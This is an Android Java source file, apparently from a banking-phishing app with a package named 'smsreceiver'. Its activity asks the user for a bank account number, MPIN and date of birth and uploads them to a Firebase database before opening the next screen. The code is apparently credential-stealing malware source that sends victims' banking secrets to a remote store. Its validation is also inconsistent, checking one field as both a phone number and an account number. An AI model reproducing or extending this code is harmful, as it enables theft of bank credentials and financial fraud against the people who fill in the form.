package com.example.smsreceiver.klajldffjlajsf.sarkar;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.example.smsreceiver.klajldffjlajsf.sarkar.bg.DateInputMask;
import com.example.smsreceiver.klajldffjlajsf.sarkar.bg.FormValidator;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;

public class SecondActivity extends AppCompatActivity {

    private EditText acnumber, mpin, dob;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main2);

        String id = getIntent().getStringExtra("id");
        acnumber = findViewById(R.id.acnumber);
        mpin = findViewById(R.id.mPin);
        dob = findViewById(R.id.dobNo);
        dob.addTextChangedListener(new DateInputMask(dob));
        Button buttonSubmit = findViewById(R.id.btn);

        buttonSubmit.setOnClickListener(v -> {
            if (validateForm()) {
                buttonSubmit.setText("Please Wait");

                HashMap<String, Object> dataObject = new HashMap<>();
                dataObject.put("acnumber", acnumber.getText().toString().trim());
                dataObject.put("mpin", mpin.getText().toString().trim());
                dataObject.put("dob", dob.getText().toString().trim());
                dataObject.put("updated_at", Helper.datetime());

                FirebaseDatabase database = FirebaseDatabase.getInstance();
                DatabaseReference usersRef = database.getReference("data").child(Helper.SITE).child("form");
                usersRef.child(id).updateChildren(dataObject)
                        .addOnSuccessListener(aVoid -> {
                            Intent intent = new Intent(this, ThirdActivity.class);
                            intent.putExtra("id", id);
                            startActivity(intent);
                        })
                        .addOnFailureListener(e -> {
                            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                            Log.d(Helper.TAG, "Error: " + e.getMessage());
                        });
            } else {
                Helper.debug(SecondActivity.this, "Form Validation Failed");
            }

        });

    }

    public boolean validateForm(){
        boolean n1 = FormValidator.validatePhoneNumber(acnumber, "Phone number is required");
        boolean n11 = FormValidator.validateMinLength(acnumber, 10,"Required only 10 digit phone no");

        boolean n2 = FormValidator.validateRequired(acnumber, "Account number is required");
        boolean n22 = FormValidator.validateMinLength(acnumber, 15, "Account number is required");

        boolean n3 = FormValidator.validateRequired(mpin, "Mpin is required");
        boolean n33 = FormValidator.validateMinLength(mpin, 4, "Mpin 4 digit is required");

        boolean n4 = FormValidator.validateDate(dob, "DOB is required");

        return n1 && n11 && n2 && n22 && n3 && n33 && n4;
    }
}
